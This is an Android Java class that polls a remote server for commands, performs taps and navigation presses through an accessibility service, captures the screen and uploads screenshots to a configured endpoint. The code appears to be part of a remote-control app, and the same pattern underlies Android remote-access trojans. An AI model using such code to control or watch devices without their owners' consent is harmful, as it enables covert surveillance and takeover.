package com.remotecontrol;

import android.content.Context;
import android.util.Log;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class HttpPollingEngine implements Runnable {
    private static final String TAG = "HttpPollingEngine";
    private final Context context;
    private final OkHttpClient httpClient;
    private volatile boolean running = true;

    public HttpPollingEngine(Context context) {
        this.context = context.getApplicationContext();
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(15, TimeUnit.SECONDS)
                .build();
    }

    public void stop() {
        running = false;
    }

    @Override
    public void run() {
        while (running) {
            try {
                Request request = new Request.Builder()
                        .url(Config.ENDPOINT_GET_COMMAND)
                        .get()
                        .build();

                try (Response response = httpClient.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        String body = response.body().string();
                        if (!body.equals("wait")) {
                            Log.d(TAG, "Команда: " + body);
                            handleCommand(new JSONObject(body));
                            sendAck();
                        }
                    }
                }
                Thread.sleep(1500);
            } catch (Exception e) {
                Log.e(TAG, "Ошибка опроса: " + e.getMessage());
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void handleCommand(JSONObject json) {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) return;

            String action = json.getString("a");
            if (action.equals("tap")) {
                service.performClick((float)json.getDouble("x"), (float)json.getDouble("y"));
            } else if (action.equals("home")) {
                service.pressHome();
            } else if (action.equals("back")) {
                service.pressBack();
            } else if (action.equals("recents")) {
                service.pressRecents();
            }
            // После любой команды пробуем сделать скриншот
            context.startActivity(new android.content.Intent(context, ScreenCaptureRequestActivity.class)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception e) {
            Log.e(TAG, "Ошибка команды: " + e.getMessage());
        }
    }

    private void sendAck() {
        Request req = new Request.Builder().url(Config.ENDPOINT_ACK).get().build();
        try { httpClient.newCall(req).execute().close(); } catch (Exception ignored) {}
    }

    public void uploadScreenshot(File file) {
        if (file == null || !file.exists()) return;
        
        // Отправка картинки как Binary Body
        RequestBody body = RequestBody.create(file, MediaType.parse("image/jpeg"));
        Request req = new Request.Builder()
                .url(Config.ENDPOINT_UPLOAD)
                .post(body)
                .build();

        try (Response resp = httpClient.newCall(req).execute()) {
            Log.i(TAG, "Upload: " + resp.code());
        } catch (IOException e) {
            Log.e(TAG, "Upload error: " + e.getMessage());
        } finally {
            file.delete();
        }
    }
}
